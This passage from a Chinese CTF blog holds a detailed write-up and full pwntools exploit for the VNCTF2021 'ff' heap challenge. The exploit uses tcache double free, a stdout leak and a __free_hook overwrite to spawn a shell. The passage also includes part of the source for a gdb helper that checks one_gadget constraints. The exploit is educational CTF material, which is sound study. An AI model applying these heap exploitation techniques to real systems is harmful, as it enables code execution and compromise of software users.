class="line">delete(<span class="number">11</span>)<span class="comment">#goto unsorted bin</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">10</span>)<span class="comment">#leak libc</span></span><br><span class="line">libc_base=recv_libc()-<span class="number">0x1e3c00</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">value=((heap_base+<span class="number">0x2a0</span>)&gt;&gt;<span class="number">12</span>)^free_hook</span><br><span class="line"></span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x1769</span>,<span class="number">0x172A</span>,<span class="number">0x1754</span>,<span class="number">0x173F</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(value))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x70</span>,p64(sys_addr))</span><br><span class="line">delete(<span class="number">12</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303191159819.png" alt="image-20230319115958381" style="zoom: 50%;" />







<h4 id="VNCTF2021-ff"><a href="#VNCTF2021-ff" class="headerlink" title="VNCTF2021-ff"></a>VNCTF2021-ff</h4><p>题目附件在 BUUCTF 中的 VNCTF2021 比赛中可以找到</p>
<h5 id="保护策略"><a href="#保护策略" class="headerlink" title="保护策略"></a>保护策略</h5><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303201401195.png" alt="image-20230320140126119"></p>
<h5 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h5><p><code>libc</code> 为 <code>2.32-0ubuntu3_amd64</code> ，这个版本存在 <code>safe-Linking</code> 机制</p>
<p><code>add</code> 函数，对 <code>size</code> 进行了限制，最大能申请 <code>0x7f</code> ,并且申请出来的堆块索引会被赋值为全局变量 <code>idx</code> ，最多申请 <code>0x10</code> 个堆块</p>
<p><code>delete</code> 函数存在 <code>UAF</code> 漏洞，但是我们无法选择索引释放指定的堆块，只能释放索引为 <code>idx</code> 的堆块（也就是只能释放最近一次申请的堆块）</p>
<p><code>show</code> 函数也是只能打印出最近一次申请堆块中的八个字节数据，并且 <code>show</code> 函数只有一次执行的机会 </p>
<p><code>edit</code> 函数只能向最近一次堆块中写入 <code>0x10</code> 字节的数据，并且 <code>edit</code> 函数只能执行两次</p>
<h5 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h5><p>因为本题一个麻烦的点在于 <code>edit</code> <code>show</code> <code>delete</code> 函数都只能对最近一个申请出来的堆块操作，所以需要反复调试进行一个布局。</p>
<p><code>add</code> 函数最大申请 <code>0x80</code> 的堆块，这就导致了泄露 <code>libc</code> 地址泄露不出来（即使填满 <code>tcache bin</code> 因为还需要做一个阻止与 <code>top chunk</code> 合并的堆块，也是无法将 <code>libc</code> 泄露出来的，就算真的泄露出来还要考虑 <code>safe-Linking</code> ）</p>
<p>所以这里最终选择的是泄露 <code>heap</code> 地址，利用 <code>UAF</code> 加上 <code>show</code> 函数即可泄露堆地址（将泄露出来的数据左移 <code>12</code> 位）</p>
<p>需要注意的是 <code>edit</code> 函数可以写入 <code>0x10</code> 个字节的数据，这样可以篡改 <code> free</code> 状态堆块的 <code>key</code> 字段，给了我们 <code>double free</code> 的机会，目的是去将 <code>pthread_tcache_struct</code> 申请出来（此时两次 <code>edit</code> 机会已经用完）</p>
<p>之后泄露 <code>libc</code> 肯定要考虑残留一个 <code>main_arena+96</code> 地址，然后爆破申请 <code>_IO_2_1_stdout_</code> 结构体泄露 <code>libc</code> 。本题堆块即使填满 <code>tcache bin</code> 也会落入 <code>fast bin</code> 中（<code>0x90</code> 虽然落不进去，但产生了 <code>main_arena+96</code> 也没办法改为 <code>_IO_2_1_stdout_</code> 地址）</p>
<p>所以只能将 <code>pthread_tcache_struct</code> 释放掉进入 <code>unsorted bin</code> ，当我们每次去从 <code>unsorted bin</code> 中切割堆块的时候，都会残留 <code>main_arena+96</code> 在 <code>pthread_tcache_struct</code> 中，当 <code>main_arena+96</code> 正好落到 <code>tcache</code> 头指针的位置，我们再切割 <code>unsorted bin</code> 的时候就能篡改 <code>main_arena+96</code> 改为 <code>_IO_2_1_stdout</code> 地址了。</p>
<p>注意：从 <code>tcache bin</code> 中申请堆块出来需要保证 <code>counts &gt; 0</code> ，为了最后还有机会做一个 <code>__free_hook</code> 申请出来，我们必须让申请出来的堆块尽可能小（在后面堆块布局的时候就会发现这点）</p>
<h5 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h5><p>调试过程主要演示如何将 <code>__IO_2_1_stdout</code> 和 <code>__free_hook</code> 申请出来</p>
<p>下图是申请 <code>pthread_tcache_struct</code> 前的情况，申请出来要写入 <code>b&#39;\x00\x00&#39; * 0x27 + b&#39;\x07\x00&#39;</code> ，这样正好将 <code>0x290</code> 这条链的 <code>counts</code> 设置为 <code>7</code>，保证了释放掉 <code>pthread_tcache_struct</code> 后可以进入 <code>unsorted bin</code></p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303202028776.png" alt="image-20230320202839431" style="zoom: 50%;" />



<p>下图是 <code>pthread_tcache_struct</code> 进入了 <code>unsorted bin</code> ，接下来我们需要反复从 <code>unsorted bin</code> 里来切堆块</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303202032910.png" alt="image-20230320203243312" style="zoom:50%;" />



<p>我们第一个要切下来的堆块大小为 <code>0x40</code>，写入的数据为 <code>&#39;\x00\x00&#39;*3+&#39;\x01\x00&#39;*1+&#39;\x00\x00&#39;*2+&#39;\x01\x00&#39;+&#39;\x00&#39;*0x38</code> ，这样才可以让 <code>0x50</code> 和 <code>0x80</code> 这两条链上的 <code>counts</code> 为 <code>1</code>（如下图）（这里就是一个布局，为后面申请 <code>_IO_2_1_stdout</code> 和 <code>__free_hook</code> 做准备）</p>
<p>自己做题的时候，这里肯定不是第一次就能写出来的，等调试到后面发现这里需要构造 <code>counts</code> ，才拐回来布置的，包括申请的堆块大小为 <code>0x40</code> 也是反复调试更改后确定的。总结一下就是这些数据都是调试得来的。</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303202035978.png" alt="image-20230320203552375" style="zoom:50%;" />



<p>再次申请一个 <code>0x30</code> 堆块，这次发送的数据全部填写 <code>\x00</code> 即可，此时 <code>pthread_tcache_struct</code> 中已经残留了被切割后的 <code>main_arena+96</code> （如下图）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303202041239.png" alt="image-20230320204130712" style="zoom:50%;" />



<p>申请一个 <code>0x10</code> 的堆块，写入数据为 <code>\xc0\x16</code> （这是 <code>_IO_2_1_stdout_</code> 的后两字节，不过第一位需要爆破），写入的数据会正好落在刚刚残留的 <code>main_arena+96</code> 上，从而产生了 <code>_IO_2_1_stdout_</code> 地址，并且 <code>0x50</code> 这条链的 <code>counts</code> 已经被设置为 <code>1</code>  了，所以是可以申请出来的（如下图）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303202045688.png" alt="image-20230320204516358" style="zoom:50%;" />



<p><code>io leak</code> 就不说了 此处<code>exp</code> 的代码为 </p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x40</span>,p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p> 具体做法请参考 <a href="https://zikh26.github.io/posts/a9dd00f0.html">文章</a> ，现在我们已经拿到了 <code>libc</code> 地址并且 <code>bins</code> 的情况如下</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303202052487.png" alt="image-20230320205222092" style="zoom:50%;" />



<p>申请一个 <code>0x10</code> 的堆块，写入 <code>__free_hook</code> 的地址，该地址会正好落在 <code>0x80</code> 的 <code>tcache</code> 头（如下），<code>__free_hook</code> 为什么会正好落在这里？   别问，问就是布局 ◕‿◕</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303202055913.png" alt="image-20230320205508486" style="zoom:50%;" />



<p>因为之前已经将 <code>0x80</code> 这条链的 <code>counts</code> 设置为 <code>1</code>，所以可以直接将 <code>__free_hook</code> 申请出来，然后写入 <code>system</code> 地址。然后观察 <code>0x20</code> 这条链是没有任何数据的，我们就可以申请一个 <code>0x20</code> 的堆块存入 <code>/bin/sh</code> 再将其释放，即可获取 <code>shell</code></p>
<p>本题注意的几点：</p>
<ol>
<li>很多看似顺理成章的布局，其实都是反复调试出来的</li>
<li><code>counts</code> 为 <code>0</code> 的时候，从 <code>tcache bin</code> 中申请不出来堆块</li>
<li><code>counts</code> 大于 <code>0</code> 的时候，如果里面的值不是一个合法地址，则申请时会报错</li>
<li>为了打最后的 <code>tcache poisoning</code> ，必须要让每次申请堆块的 <code>size</code> 尽可能的小，这样才能让 <code>__free_hook</code> 落在 <code>0x80</code> ，再往后的话因为对 <code>add</code> 函数中对  <code>size</code> 检查的原因，就申请不出来了</li>
<li>往 <code>pthread_tcache_struct</code> 中写入数据时，尽可能的写入 <code>\x00</code> ，不然可能会破坏某些 <code>tcache bin</code> 的 <code>counts</code></li>
</ol>
<h5 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h5><p><a href="https://zikh26.github.io/posts/ad411136.html">tools源码</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;pwn&quot;</span>,<span class="string">&quot;node4.buuoj.cn:26738&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size:\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content:\n&quot;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">heap_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))&lt;&lt;<span class="number">12</span></span><br><span class="line">log_addr(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line">edit(p64(((heap_base+<span class="number">0x2a0</span>)&gt;&gt;<span class="number">12</span>)^(heap_base+<span class="number">0x10</span>)))</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x70</span>, <span class="string">b&#x27;\x00\x00&#x27;</span> * <span class="number">0x27</span> + <span class="string">b&#x27;\x07\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;\x00\x00&#x27;</span>*<span class="number">3</span>+<span class="string">&#x27;\x01\x00&#x27;</span>*<span class="number">1</span>+<span class="string">&#x27;\x00\x00&#x27;</span>*<span class="number">2</span>+<span class="string">&#x27;\x01\x00&#x27;</span>+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span>+<span class="string">&#x27;\xc0\x16&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#delete()</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>,p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">libc_base=recv_libc()-<span class="number">0x1e4744</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0xE86</span>,<span class="number">0xE6D</span>,<span class="number">0xE5E</span>,<span class="number">0xED5</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">add(<span class="number">0x70</span>,p64(libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303201357465.png" alt="image-20230320135639350"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/bd34f701.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/bd34f701.html" class="post-title-link" itemprop="url">check_gadget--检测one_gadget能否使用的gdb命令</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:56:19" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%B0%9D%E8%AF%95%E5%BC%80%E5%8F%91%E5%B0%8F%E5%B7%A5%E5%85%B7/" itemprop="url" rel="index"><span itemprop="name">尝试开发小工具</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>作为一个 <code>pwner</code> ，对 <code>one_gadget</code> 肯定不会陌生，如果在能劫持执行流的前提下， <code>one_gadget</code> 在劫持执行流的位置也恰巧能用，那就可以在一定程度上简化获取 <code>shell</code> 的操作，因为执行 <code>system(&quot;/bin/sh\x00&quot;)</code> 是需要控制参数的，有些情况下劫持执行流容易但可能控制参数还得再废些力气，此时成功打一发 <code>one_gadget</code> 可以说是方便又迅速。</p>
<p>但因为 <code>one_gadget</code> 条件的限制， <code>one_gadget</code> 成功的概率并不高，通常是一个一个试，或者调试到劫持执行流的位置观察一下寄存器和内存的情况进行判断。很早之前我就有这样一个想法，如果能用 <code>gdb</code> 调试到劫持的地址处，输入一个命令直接判断所有的 <code>one_gadget</code> 能否生效该有多方便。终于在几天前进行了动手实践，并将其写出来。</p>
<p><code>check_gadget</code> 是一个 <code>gdb</code> 命令，该命令我是用 <code>python</code> 进行编写的 这篇 <a href="https://zikh26.github.io/posts/26ba4673.html">文章</a> 记录了如何用 <code>python</code> 来自定义命令。</p>
<h2 id="使用效果"><a href="#使用效果" class="headerlink" title="使用效果"></a>使用效果</h2><p>此处控制了 <code>__free_hook</code> </p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302081628082.png" alt="image-20230208162838925" style="zoom:50%;" />

<p>然后我们 <code>si</code> 进去，使用 <code>check_gadget</code> 命令，发现了一个可用的 <code>one_gadget</code></p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302081627797.png" alt="image-20230208162716225" style="zoom: 50%;" />



<p>该命令是判断当前位置的 <code>one_gadget</code> 能否生效,所以这个命令在哪里都可以使用，但真正用到 <code>one_gadget</code> 的地方应该是我们控制执行流的地址。</p>
<p>即使在对 <code>32</code> 位的程序的判断中，该命令依然发挥出色</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302081633584.png" alt="image-20230208163319420"></p>
<h2 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h2><p>这个命令本身是依赖 <code>one_gadget</code> 的返回条件进行判断的，但有时候 <code>one_gadget</code> 给出的条件虽然不满足但也能获取 <code>shell</code> （如下），而 <code>check_gadget</code> 命令无法检测出来这种情况。</p>
<p>下图是跳转到了一个 <code>one_gadget</code> 中，并没有满足 <code>one_gadget</code> 的条件，但依然可以获取 <code>shell</code></p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302081609202.png" alt="image-20230208160957660" style="zoom:50%;" />

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302081611903.png" alt="image-20230208161106805" style="zoom:50%;" />



<h2 id="设计思路"><a href="#设计思路" class="headerlink" title="设计思路"></a>设计思路</h2><p>判断 <code>one_gadget</code> 的大致想法无非就两个，第一个是直接改变 <code>rip</code> 跑一遍 <code>one_gadget</code> （ <strong>winmt</strong> 师傅给我的提示是在当前要测试 <code>one_gadget</code> 的位置直接开多个子进程然后分别改变 <code>rip</code> 为不同的 <code>one_gadget</code> 以便测试所有的 <code>one_gadget</code> ），第二个思路就是我的这种，去将 <code>one_gadget</code> 的条件提取出来，访问寄存器和内存的值，来检查条件是否成立。</p>
<p>其实第一种思路我认为才是最优解，主要是 <strong>winmt</strong> 师傅给我说这种思路的时候我已经把命令写完了 QAQ ,因为第二种思路有上面所提到的缺陷。</p>
<p>下面说一下我这个命令的整体实现思路</p>
<ol>
<li>首先去获取 <code>one_gadget</code> 的所有信息，并进行逐一分组</li>
<li>逐一判断每个 <code>one_gadget</code> 中的条件，利用正则表达式和 <code>if</code> 判断识别其特征，并调用相应的处理函数</li>
<li>获取其关键信息，比如 <code>[rsp+0x40] == NULL</code> 这个条件,就需要先识别出来外面有一组 <code>[]</code> ，然后还需要提取出来 <code>rsp</code> <code>+</code> <code>0x40</code> 这三个关键信息，利用 <code>gdb</code> 模块中的一些函数来访问寄存器和内存的值，进行处理后来判断等式是否成立</li>
<li>最后将一组命令的返回值都存储到一个列表中，只需要遍历返回值列表就知道哪组 <code>one_gadget</code> 可以使用或者不能使用</li>
</ol>
<h2 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h2><p>首先需要确定你的 <code>gdb</code> 版本要比较新，至少我在老掉牙的 <code>ubuntu18.04</code> 中，<code>gdb</code> 版本为 <code>8.1.1</code> 是没法用的。我使用这个命令的环境是 <code>ubuntu 22.04</code> <code>gdb</code> 版本为 <code>12.0.90</code> </p>
<p>然后创建一个 <code>command.py</code> 文件（名字随意，位置也随意），将下面的源代码复制进去</p>
<p>然后在 <code>.gdbinit</code> 文件中引入这个 <code>command.py</code> 文件即可（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302081641185.png" alt="image-20230208164134100"></p>
<p>然后启动 <code>gdb</code> 调试，就可以使用该命令了</p>
<h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">a,b=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(a,b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc_path</span>():</span><br><span class="line">    recv_data = gdb.execute(<span class="string">&quot;vmmap&quot;</span>,to_string=<span class="literal">True</span>)</span><br><span class="line">    lines = recv_data.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">      <span class="keyword">if</span> <span class="string">&#x27;libc&#x27;</span> <span class="keyword">in</span> line:  </span><br><span class="line">        string=line.split()[-<span class="number">1</span>]</span><br><span class="line">        string = string[:-<span class="number">4</span>]</span><br><span class="line">        <span class="keyword">return</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_gadget_info</span>(<span class="params">library</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    该函数作用是获取当前 libc 的 one_gadget信息 -l2除外</span></span><br><span class="line"><span class="string">    将每一组的 one_gadget 信息（地址和条件）放到一个元组里面，作为返回列表的一个元素</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    参数：</span></span><br><span class="line"><span class="string">    library(str): 当前程序所依赖的 libc 库路径</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    返回值：</span></span><br><span class="line"><span class="string">    gadgets_info(list): 列表中的元素是元组（装有一组 one_gadget 信息），后续进行条件判断时只需要对该列表进行遍历</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    result = subprocess.run([<span class="string">&quot;one_gadget&quot;</span>, library], stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">if</span> (result.returncode != <span class="number">0</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error: &quot;</span>, result.stderr.decode().strip())</span><br><span class="line">        sys.exit(result.returncode)</span><br><span class="line">    gadgets = result.stdout.decode().strip().split(<span class="string">&quot;\n\n&quot;</span>)  <span class="comment"># 将每个gadget的条件和信息都作为一个元素存储到列表中</span></span><br><span class="line">    gadgets_info = []</span><br><span class="line">    <span class="keyword">for</span> gadget <span class="keyword">in</span> gadgets:</span><br><span class="line">        <span class="comment"># 依次对每组元素进行单独的处理</span></span><br><span class="line">        address_line, constraints_line = gadget.strip().split(<span class="string">&quot;\nconstraints:&quot;</span>)</span><br><span class="line">        address = address_line.strip().split()[<span class="number">0</span>]</span><br><span class="line">        constraints = constraints_line.strip().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        gadgets_info.append((address, constraints))</span><br><span class="line">    <span class="keyword">return</span> gadgets_info</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_register_value</span>(<span class="params">register</span>):</span><br><span class="line">    <span class="keyword">return</span> gdb.parse_and_eval(<span class="string">&#x27;$&#x27;</span>+register)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_address_permissions</span>(<span class="params">address</span>):</span><br><span class="line">    recv_data = gdb.execute(<span class="string">&quot;vmmap &quot;</span>+<span class="built_in">str</span>(address),to_string=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;There are no mappings for specified address or module&quot;</span> <span class="keyword">in</span> recv_data:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    recv_data=recv_data.split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">    recv_data=recv_data.strip().split()</span><br><span class="line">    permissions=recv_data[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;w&#x27;</span> <span class="keyword">in</span> permissions:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_got_address_of_libc</span>(<span class="params">string</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    该函数用来判断目标地址是否为 got_address_of_libc(这个地址是 libc 中具有 rw 权限的首地址)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    参数：</span></span><br><span class="line"><span class="string">    string(str):传入的为 one_gadget 需要判断是否为 got_address_of_libc的字符串</span></span><br><span class="line"><span class="string">    例如：</span></span><br><span class="line"><span class="string">    &quot;ebx is the GOT address of libc&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    返回值:</span></span><br><span class="line"><span class="string">    (bool):如果目标地址为 got_address_of_libc 那么返回 True ，反之返回 False</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">match</span>=re.findall(<span class="string">&#x27;(\w+) is the GOT address of libc&#x27;</span>,string)</span><br><span class="line">    register_value=get_register_value(<span class="keyword">match</span>[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(register_value) &lt; <span class="number">0</span>:</span><br><span class="line">        register_value=register_value+(<span class="number">1</span>&lt;&lt;<span class="number">32</span>)</span><br><span class="line">    recv_data = gdb.execute(<span class="string">&quot;vmmap&quot;</span>,to_string=<span class="literal">True</span>)</span><br><span class="line">    lines = recv_data.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;rw&quot;</span> <span class="keyword">in</span> line <span class="keyword">and</span> <span class="string">&quot;libc&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">            got_address_of_libc=line.split()[<span class="number">0</span>][<span class="number">5</span>:]</span><br><span class="line">            <span class="keyword">if</span> register_value == <span class="built_in">int</span>(got_address_of_libc,<span class="number">16</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_writeable_check</span>(<span class="params">string</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    这个函数的作用是来判断one_gadget中某个地址是否具有可写的权限</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    0xebcf5 execve(&quot;/bin/sh&quot;, r10, rdx)</span></span><br><span class="line"><span class="string">    constraints:</span></span><br><span class="line"><span class="string">        address rbp-0x78 is writable</span></span><br><span class="line"><span class="string">        [r10] == NULL || r10 == NULL</span></span><br><span class="line"><span class="string">        [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string">    例如上面one_gadget的第一个条件  address rbp-0x78 is writable</span></span><br><span class="line"><span class="string">    该函数将自己获取rbp-0x78 (如果是单个寄存器也可以进行判断 比如判断rsi当前地址是否具有写的权限) 的地址判断其是否为一个具有写权限的地址</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    参数：</span></span><br><span class="line"><span class="string">    string(str):该参数是one_gadget关于某个地址是否为可写的条件字符串  例如“address rbp-0x78 is writable”</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    返回值：</span></span><br><span class="line"><span class="string">    (bool): 判断目标地址是否具有可写权限  如果具有写权限则返回True  反之返回False</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    result = re.findall(<span class="string">r&#x27;(\w+)\s*([+-])\s*(\w+)&#x27;</span>, string)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> result:</span><br><span class="line">        result = re.findall(<span class="string">r&#x27;\b\w+\b&#x27;</span>, string)</span><br><span class="line">        result = result[<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span 